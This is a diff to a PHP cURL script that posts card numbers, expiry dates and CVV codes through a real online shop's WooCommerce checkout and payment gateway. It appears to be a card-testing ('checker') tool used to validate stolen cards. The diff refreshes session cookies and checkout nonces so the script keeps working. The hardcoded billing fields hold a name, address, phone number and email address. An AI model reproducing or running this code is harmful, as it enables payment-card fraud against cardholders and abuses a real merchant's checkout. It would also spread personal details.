@@ -238,7 +238,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: PHPSESSID=18daeaefb7bf48f1bd896a0984d9b3a1; woocommerce_items_in_cart=1; wp_woocommerce_session_8878161dc01271bf7d1eedb65f03cb32=e3d22299f581ff8cb8ab152803a07fd5%7C%7C1595062961%7C%7C1595059361%7C%7C8ad40e506aaddd4374fdf185af089d64; redux_blast=1594984518; woocommerce_cart_hash=eef632ceb30af7acd218296c92d76ce5',
+'cookie: PHPSESSID=18daeaefb7bf48f1bd896a0984d9b3a1; wp_woocommerce_session_8878161dc01271bf7d1eedb65f03cb32=e3d22299f581ff8cb8ab152803a07fd5%7C%7C1595062961%7C%7C1595059361%7C%7C8ad40e506aaddd4374fdf185af089d64; redux_blast=1594984518; woocommerce_items_in_cart=1; woocommerce_cart_hash=d43e88efb7fec97594b803d244063dc9',
 'origin: https://romandaniels.com',
 'referer: https://romandaniels.com/checkout/',
 'user-agent: '.$browser.''
@@ -246,7 +246,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+Avenue+Road&billing_address_2=&billing_city=HIGHGATE&billing_state=SA&billing_postcode=5063&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=12+Avenue&shipping_address_2=&shipping_city=Bristol&shipping_state=NSW&shipping_postcode=BS3+1SJ&order_comments=&shipping_method%5B0%5D=free_shipping%3A3&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=d9d0e79744&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'billing_first_name=Vincent&billing_last_name=Warner&billing_company=&billing_country=AU&billing_address_1=12+Avenue+Road&billing_address_2=&billing_city=HIGHGATE&billing_state=SA&billing_postcode=5063&billing_phone=%2B615182641524&billing_email=pubgkittu%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=12+Avenue&shipping_address_2=&shipping_city=Bristol&shipping_state=NSW&shipping_postcode=BS3+1SJ&order_comments=&shipping_method%5B0%5D=free_shipping%3A3&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=2ac9d7112c&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 // // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
